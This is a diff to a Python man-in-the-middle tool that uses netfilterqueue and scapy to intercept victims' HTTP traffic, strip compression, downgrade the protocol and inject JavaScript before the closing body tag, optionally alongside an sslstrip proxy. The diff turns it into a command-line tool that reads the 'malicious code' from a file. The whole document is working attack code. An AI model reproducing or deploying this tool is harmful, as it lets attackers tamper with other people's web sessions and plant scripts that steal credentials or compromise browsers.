@@ -1,5 +1,6 @@
 import subprocess
 import netfilterqueue
+import argparse
 import scapy.layers.l2 as l2
 import scapy.all as scapy
 import scapy.layers.inet as inet
@@ -7,8 +8,7 @@ import re
 
 class CodeInjector:
 
-    def __init__(self, spoof_server_ip, injected_code, use_sslstrip_proxy=False):
-        self.spoof_server_ip = spoof_server_ip
+    def __init__(self, injected_code, use_sslstrip_proxy=False):
         self.use_sslstrip_proxy = use_sslstrip_proxy
         self.injected_code = injected_code
 
@@ -33,16 +33,13 @@ class CodeInjector:
         scapy_packet = inet.IP(packet.get_payload())
         if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(inet.TCP):
             if scapy_packet[inet.TCP].dport in {8080, 80}:
-                print("[+] Request")
                 data_raw = scapy_packet[scapy.Raw].load.decode('iso-8859-1')
                 #downgrade from http/1.1 to http/1.0
                 data_raw = data_raw.replace("HTTP/1.1\\r\\n","HTTP/1.0\\r\\n")
                 scapy_packet[scapy.Raw].load = re.sub("Accept-Encoding:.*?\\r\\n","",
                     data_raw)
                 self.__modify_packet(packet, scapy_packet)
-                print(scapy_packet.show())
             elif scapy_packet[inet.TCP].sport in {8080, 80}:
-                print("[+] RESPONSE")
                 body_tag = None
                 data_raw = scapy_packet[scapy.Raw].load.decode('iso-8859-1')
                 if data_raw.find("</body>") >= 0:
@@ -68,7 +65,6 @@ class CodeInjector:
                 if upgrade_packet:
                     scapy_packet[scapy.Raw].load = data_raw
                     self.__modify_packet(packet, scapy_packet)
-                print(scapy_packet.show())               
         packet.accept()
 
     def start_injector(self):
@@ -81,8 +77,16 @@ class CodeInjector:
             self.__restore()        
 
 
-code_injector = CodeInjector("sds", injected_code="alert(\"Esti expus\");", use_sslstrip_proxy=False)
-
-code_injector.start_injector()
+parser = argparse.ArgumentParser(description='Code injection tool')
+parser.add_argument("--file", help="path to file that contain javascript injected code", required=True)
+parser.add_argument("--use_proxy", help="Set true if you want to use another proxy that downgrade https to http."
+                        + "This server must use port 8080.", default=False)
+args = parser.parse_args()
+file_path = args.file
+use_proxy = args.use_proxy
+with open(file=file_path, mode="r") as file_code:
+    malicious_code = file_code.read()
+    code_injector = CodeInjector(injected_code=malicious_code, use_sslstrip_proxy=use_proxy)
+    code_injector.start_injector()
 
 
